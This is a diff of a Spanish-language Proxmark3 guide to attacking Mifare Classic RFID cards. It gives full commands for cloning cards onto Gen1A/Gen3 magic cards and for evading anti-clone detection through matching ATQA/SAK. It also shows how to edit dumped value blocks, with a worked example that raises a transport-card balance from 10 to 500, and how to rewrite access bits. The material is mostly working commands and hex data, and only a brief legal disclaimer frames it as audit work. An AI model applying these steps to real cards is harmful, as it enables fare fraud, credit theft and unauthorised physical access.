+| `-k, --keys <fn>` | Archivo con las claves |
+| `-f, --file <fn>` | Archivo de dump a restaurar |
+| `--emu` | Cargar datos en el emulador después de restaurar |
+
+##### Método 2: Clonación Manual para Tarjetas Gen1A
+
+Las tarjetas Gen1A requieren comandos especiales de backdoor para modificar el bloque 0:
 
 ```bash
-hf mf csetuid --uid <UID_ORIGINAL>
+# 1. Identificar el tipo de tarjeta mágica
+hf mf info
+# Salida esperada: [+] Magic capabilities... Gen 1a
+
+# 2. Limpiar la tarjeta (opcional pero recomendado)
+# Para 1K:
+hf mf cwipe -u A29558E4 -a 0004 -s 08
+# Para 4K:
+hf mf cwipe -u A29558E4 -a 0044 -s 18
+
+# 3. Cargar el dump en la tarjeta usando comandos Gen1a
+hf mf cload -f hf-mf-A29558E4-dump.bin
+
+# 4. Establecer el UID (si no se estableció con cload)
+hf mf csetuid -u A29558E4 -a 0004 -s 08
+
+# 5. Verificar la clonación
+hf mf info
+hf mf dump --1k
+```
+
+**Comandos Gen1A disponibles:**
+
+| Comando | Función |
+|---------|----------|
+| `hf mf csetuid` | Establecer UID en tarjeta Gen1a |
+| `hf mf cwipe` | Limpiar tarjeta a valores por defecto |
+| `hf mf csetblk` | Escribir bloque individual vía backdoor |
+| `hf mf cgetblk` | Leer bloque individual vía backdoor |
+| `hf mf cgetsc` | Leer sector completo vía backdoor |
+| `hf mf cload` | Cargar dump completo en tarjeta |
+| `hf mf csave` | Guardar contenido de tarjeta |
+| `hf mf cview` | Visualizar contenido de tarjeta |
+
+##### Método 3: Clonación con Tarjetas Gen3 (APDU)
+
+Las tarjetas Gen3 utilizan comandos APDU estándar, haciéndolas compatibles con Android:
+
+```bash
+# Cambiar solo el UID (recomendado para Gen3)
+hf mf gen3uid -u A29558E4
+
+# O escribir el bloque 0 completo
+hf mf gen3blk -d A29558E4440804006263646566676869
+
+# ADVERTENCIA: Bloquear permanentemente (irreversible)
+# hf mf gen3freeze
+```
+
+**Advertencias Críticas:**
+
+⚠️ **Tarjetas Gen1A:**
+- Son fácilmente detectables por sistemas de seguridad modernos
+- Algunos lectores ejecutan el comando de detección `40(7)` automáticamente
+- NO recomendadas para entornos con medidas anti-clonación activas
+
+⚠️ **Tarjetas Gen2:**
+- Más difíciles de detectar que Gen1A
+- Algunos sistemas pueden detectarlas mediante pruebas de escritura directa al bloque 0
+- El ATQA y SAK pueden variar según el fabricante
+
+⚠️ **Configuración de ATQA/SAK:**
+- Debe coincidir **exactamente** con la tarjeta original
+- ATQA incorrecto puede causar que la tarjeta no sea reconocida
+- SAK incorrecto puede revelar que es una tarjeta mágica
+
+⚠️ **Recuperación de Tarjeta "Bricked":**
+
+Si una tarjeta Gen2 no responde después de escribir datos incorrectos en el bloque 0:
+
+```bash
+# Forzar configuración de anticollision
+hf 14a config --atqa force --bcc ignore --cl2 skip --rats skip
+
+# Escribir bloque 0 correcto
+# Para 1K:
+hf mf wrbl --blk 0 -k FFFFFFFFFFFF -d 11223344440804006263646566676869 --force
+# Para 4K:
+hf mf wrbl --blk 0 -k FFFFFFFFFFFF -d 11223344441802006263646566676869 --force
+
+# Restaurar configuración estándar
+hf 14a config --std
+hf 14a reader
 ```
 
 ### 3.2. Manipulación de Datos
 
 Más allá de la clonación 1:1, la verdadera amenaza para muchos sistemas reside en la capacidad de un atacante para alterar datos específicos dentro de la tarjeta. En sistemas que almacenan saldos, permisos o contadores, la manipulación de datos puede tener un impacto directo, como aumentar el crédito en una tarjeta de transporte o cambiar los niveles de acceso.
 
-El proceso conceptual para modificar los datos de una tarjeta es el siguiente:
+#### Proceso de Manipulación de Datos
 
-1. Se abre el archivo de volcado de la memoria (`.bin`) en un editor hexadecimal.
-2. Dentro del editor, se localizan los bytes específicos que corresponden a los datos que se desean modificar (por ejemplo, el bloque que almacena el saldo).
-3. Se cambian los valores de esos bytes por los nuevos valores deseados y se guarda el archivo `.bin` modificado.
-4. Finalmente, se utiliza el comando `hf mf restore` para escribir el contenido del archivo modificado en una tarjeta mágica, aplicando los cambios.
+##### Paso 1: Obtener y Convertir el Volcado
+
+Dependiendo del formato del archivo de volcado, puede ser necesario convertirlo para facilitar la edición:
+
+**Formatos de archivo disponibles:**
+
+| Formato | Extensión | Descripción | Uso |
+|---------|-----------|-------------|-----|
+| Binario | `.bin` | Datos crudos de la tarjeta | Herramientas hex, scripts |
+| Emulador | `.eml` | Formato de texto legible | Edición manual fácil |
+| JSON | `.json` | Estructura de datos completa | Scripts, análisis automatizado |
+
+**Conversión entre formatos:**
 
 ```bash
-hf mf restore --file hf-mf-B4EE8234-data-modified.bin
+# Convertir .bin a .eml (más fácil de editar)
+script run data_mf_bin2eml -i hf-mf-A29558E4-dump.bin -o modified.eml
+
+# Convertir .eml de vuelta a .bin después de editar
+script run data_mf_eml2bin -i modified.eml -o modified.bin
 ```
+
+##### Paso 2: Editar el Volcado
+
+**Método 1: Edición Hexadecimal (Binario)**
+
+1. Abrir el archivo `.bin` en un editor hexadecimal (HxD, Bless, hexedit, etc.)
+2. Localizar los bytes específicos a modificar:
+   - **Bloques de valor**: Bloques configurados para almacenar saldo (formato especial de 4 bytes duplicados)
+   - **Bloques de datos**: Información de usuario (permisos, identificadores, etc.)
+   - **Sector trailers**: Claves y bits de acceso (bloques 3, 7, 11, etc.)
+
+**Estructura de un bloque de valor Mifare Classic:**
+
+```
+Byte:    0  1  2  3  |  4  5  6  7  |  8  9 10 11 | 12 13 14 15
+Datos: [Valor (LSB)] [~Valor     ] [Valor      ] [Addr][~Addr][Addr][~Addr]
+```
+
+Ejemplo de saldo de 100 unidades (0x00000064) en bloque 4:
+```
+64 00 00 00  9B FF FF FF  64 00 00 00  04 FB 04 FB
+```
+
+**Método 2: Edición de Texto (EML)**
+
+El formato `.eml` muestra cada bloque como una línea de 32 caracteres hexadecimales:
+
+```
+# Ejemplo: hf-mf-modified.eml
+A29558E4440804006263646566676869  <- Bloque 0 (UID + Manufacturer)
+00000000000000000000000000000000  <- Bloque 1 (datos)
+00000000000000000000000000000000  <- Bloque 2 (datos)
+FFFFFFFFFFFF787788C1FFFFFFFFFFFF  <- Bloque 3 (sector trailer)
+64000000 9BFFFFFF 64000000 04FB04FB  <- Bloque 4 (bloque de valor: 100 unidades)
+...
+```
+
+**Herramientas de edición:**
+
+```bash
+# Editar manualmente con editor de texto
+nano modified.eml
+
+# O usar herramientas específicas de Proxmark3
+hf mf eview -f hf-mf-A29558E4-dump.eml  # Visualizar contenido
+```
+
+##### Paso 3: Escribir los Datos Modificados
+
+**Opción A: Restauración Completa**
+
+```bash
+# Restaurar desde archivo binario modificado
+hf mf restore --1k -f modified.bin -k hf-mf-A29558E4-key.bin
+
+# Restaurar desde archivo EML (convertir primero a .bin)
+script run data_mf_eml2bin -i modified.eml -o modified.bin
+hf mf restore --1k -f modified.bin -k hf-mf-A29558E4-key.bin
+```
+
+**Opción B: Escritura Selectiva de Bloques**
+
+Para modificar solo bloques específicos sin sobrescribir toda la tarjeta:
+
+```bash
+# Escribir un bloque individual (requiere clave válida)
+hf mf wrbl --blk 4 -a -k FFFFFFFFFFFF -d 64000000 9BFFFFFF 64000000 04FB04FB
+
+# Para tarjetas Gen1a (usando backdoor, sin necesidad de clave)
+hf mf csetblk --blk 4 -d 64000000 9BFFFFFF 64000000 04FB04FB
+```
+
+**Opción C: Manipulación de Bloques de Valor**
+
+Los bloques de valor tienen comandos especiales para incrementar/decrementar:
+
+```bash
+# Ver información de bloques de valor
+hf mf value -h
+
+# Incrementar un bloque de valor
+hf mf value --blk 4 -a -k FFFFFFFFFFFF --inc 100
+
+# Decrementar un bloque de valor
+hf mf value --blk 4 -a -k FFFFFFFFFFFF --dec 50
+
+# Restaurar desde bloque de respaldo
+hf mf value --blk 4 -a -k FFFFFFFFFFFF --res
+```
+
+##### Paso 4: Verificación de Cambios
+
+```bash
+# Leer y verificar el bloque modificado
+hf mf rdbl --blk 4 -a -k FFFFFFFFFFFF
+
+# Verificar bloque de valor específicamente
+hf mf value --blk 4 -a -k FFFFFFFFFFFF
+
+# Dump completo para comparar
+hf mf dump --1k -f verification.bin
+```
+
+#### Ejemplos Prácticos de Manipulación
+
+**Caso 1: Modificar Saldo en Tarjeta de Transporte**
+
+```bash
+# 1. Obtener dump original
+hf mf autopwn
+
+# 2. Identificar bloque de saldo (ejemplo: bloque 4)
+hf mf view -f hf-mf-<UID>-dump.bin
+
+# 3. Convertir a EML para edición
+script run data_mf_bin2eml -i hf-mf-<UID>-dump.bin
+
+# 4. Editar bloque 4 en el archivo .eml
+# Cambiar saldo de 10 a 500 unidades
+# Original: 0A000000 F5FFFFFF 0A000000 04FB04FB
+# Modificado: F4010000 0BFEFFFF F4010000 04FB04FB (500 en hex = 0x1F4)
+
+# 5. Convertir de vuelta a .bin
+script run data_mf_eml2bin -i hf-mf-<UID>-dump.eml -o modified.bin
+
+# 6. Restaurar en tarjeta mágica
+hf mf restore --1k -f modified.bin -k hf-mf-<UID>-key.bin
+```
+
+**Caso 2: Cambiar Permisos de Acceso**
+
+```bash
+# Modificar bits de acceso para permitir escritura en bloques de datos
+# ADVERTENCIA: Bits de acceso incorrectos pueden bloquear la tarjeta permanentemente
+
+# Ejemplo de sector trailer con acceso modificado
+# Bloque 7 (trailer del sector 1):
+# FFFFFFFFFFFF 787788 C1 FFFFFFFFFFFF
+#              ^^^^^^ ^^  <- Access bits y GPB
+
+# Para cambiar a permisos más permisivos (FF 07 80):
+hf mf wrbl --blk 7 -b -k FFFFFFFFFFFF -d FFFFFFFFFFFFF00780 80 FFFFFFFFFFFF
+```
+
+**Advertencias Críticas:**
+
+⚠️ **Bits de Acceso:**
+- Los bits de acceso controlan qué claves pueden leer/escribir cada bloque
+- Configuración incorrecta puede **bloquear permanentemente** el sector
+- Siempre verificar con `hf mf acl -d <hex>` antes de escribir
+- NO modificar bits de acceso sin comprender completamente su funcionamiento
+
+⚠️ **Bloques de Valor:**
+- Deben mantener el formato especial: Valor, ~Valor, Valor, Addr
+- El formato es validado por hardware en algunos lectores
+- Valores inconsistentes pueden ser rechazados o causar errores
+
+⚠️ **Sector Trailers:**
+- NUNCA modificar el sector trailer (bloque 3, 7, 11, etc.) sin backup
+- Perder las claves significa perder acceso permanente al sector
+- La clave B puede estar oculta (no legible) dependiendo de los bits de acceso
+
+⚠️ **Aspectos Legales:**
+- La manipulación de tarjetas de pago, transporte o acceso ajenas es **ilegal**
+- Solo realizar en auditorías autorizadas o con sistemas propios
+- Documentar todos los cambios para el informe de auditoría
 
 Una vez que la tarjeta ha sido clonada o sus datos han sido manipulados, el siguiente paso es validar su funcionamiento en un entorno real o mediante simulación.
 
